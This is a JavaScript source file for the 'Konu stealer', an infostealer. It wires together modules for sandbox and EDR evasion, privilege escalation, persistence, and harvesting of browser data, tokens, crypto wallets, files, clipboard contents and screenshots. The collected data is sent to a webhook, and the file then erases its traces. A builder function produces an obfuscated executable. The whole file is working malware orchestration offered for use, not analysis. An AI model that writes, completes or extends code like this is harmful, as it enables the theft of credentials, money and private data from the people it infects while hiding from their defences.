/**
 * Integration Module — Connects all advanced modules to the original Konu stealer
 * This file wraps the existing code and adds the new layers
 */

// ─── Load advanced modules ────────────────────────────────────────────────────
const edrBypass = require('./edr-bypass');
const persistence = require('./persistence');
const advancedCollection = require('./advanced-collection');
const secureComms = require('./secure-comms');
const polymorphic = require('./polymorphic');
const cleanup = require('./cleanup');
const privesc = require('./privesc');
const injection = require('./injection');
const builderEnhanced = require('./builder-enhanced');

// ─── Original Konu modules (load after our wrappers) ─────────────────────────
const downloader = require('./modules/downloader');
const executor = require('./modules/executor');
const tokens = require('./modules/tokens');
const formatter = require('./modules/formatter');
const webhook = require('./modules/webhook');
const detector = require('./modules/detector');

// ─── Main execution flow ─────────────────────────────────────────────────────
async function main() {
  try {
    // Stage 1: EDR Bypass
    const bypassed = await edrBypass.checkAndBypass();
    if (!bypassed) {
      console.log('[*] Sandbox detected, exiting...');
      process.exit(0);
    }

    // Stage 2: Privilege Escalation (optional)
    await privesc.escalate();

    // Stage 3: Persistence
    await persistence.install();

    // Stage 4: Collect data using enhanced collection
    const advancedData = await advancedCollection.harvest();

    // Stage 5: Original browser collection (HackBrowserData)
    const browserData = await executor.execute();

    // Stage 6: Token extraction
    const tokenData = await tokens.extract();

    // Stage 7: Format all data
    const formattedData = {
      timestamp: new Date().toISOString(),
      userInfo: advancedData.userInfo,
      browser: browserData,
      tokens: tokenData,
      cryptoWallets: advancedData.cryptoWallets,
      sensitiveFiles: advancedData.sensitiveFiles,
      networkInfo: advancedData.networkInfo,
      clipboard: advancedData.clipboard,
      screenshot: advancedData.screenshot
    };

    // Stage 8: Secure exfiltration
    await secureComms.exfiltrate(formattedData, process.env.WEBHOOK_URL);

    // Stage 9: Cleanup traces
    await cleanup.traces();

    // Stage 10: Remove persistence (optional - comment out for long-term)
    // await persistence.cleanup();

  } catch (error) {
    // Silent error handling
  }
}

// ─── Builder integration ──────────────────────────────────────────────────────
async function build(args) {
  const config = new builderEnhanced.BuildConfig({
    os: args.os || process.platform,
    arch: args.arch || process.arch,
    modules: args.modules || ['edr-bypass', 'persistence', 'advanced-collection', 'secure-comms', 'cleanup'],
    webhook: args.webhook || '',
    filename: args.filename || 'konu.exe',
    obfuscate: true,
    pack: args.pack || false,
    sign: args.sign || false
  });

  return await builderEnhanced.build(config);
}

// ─── Run if executed directly ─────────────────────────────────────────────────
if (require.main === module) {
  main().catch(console.error);
}

module.exports = { main, build };